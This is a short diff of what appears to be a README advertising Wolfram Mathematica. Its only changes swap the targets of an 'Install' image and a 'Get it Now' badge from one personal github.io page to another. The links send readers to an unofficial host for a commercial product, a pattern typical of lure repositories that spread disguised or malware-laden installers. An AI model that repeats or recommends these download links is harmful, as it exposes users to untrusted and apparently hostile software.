@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gunbpx.github.io/.github/wolframMathematica)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://maopolo-sot.github.io/.github/wolframMathematica)
 
 </div>
 
@@ -81,7 +81,7 @@ Mathematica's symbolic computation engine represents a fundamentally different a
 
 <p align="center">
 
-[![Get it Now Wolfram Mathematica](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://gunbpx.github.io/.github/wolframMathematica)
+[![Get it Now Wolfram Mathematica](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://maopolo-sot.github.io/.github/wolframMathematica)
 
 </p>
 
